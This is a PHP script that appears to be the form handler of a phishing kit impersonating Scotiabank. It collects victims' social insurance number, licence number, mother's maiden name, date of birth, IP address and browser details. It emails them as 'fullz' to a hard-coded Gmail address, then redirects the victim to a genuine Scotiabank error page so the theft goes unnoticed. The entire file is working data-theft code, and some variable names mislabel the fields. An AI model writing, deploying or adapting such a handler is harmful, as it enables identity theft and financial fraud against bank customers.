<?php
$cvv = $_POST['sin'];
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$exp = $_POST['dl'];
$mmn = $_POST['mmn'];
$dob = $_POST['dob'];
$data ="
=============##SCOTIA FULLZ##===================
CVV : $cvv
EXP : $exp
MMN : $mmn
DOB : $dob
============EXTRA============================
IP : $ip
UA : $browserAgent
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr = 'aptiatm2323@gmail.com';

mail($emailusr, $subj, $data);	

header("Location: http://www.scotiabank.com/rd/cda/errorpage/0,1190,ca-en,00.html");

?>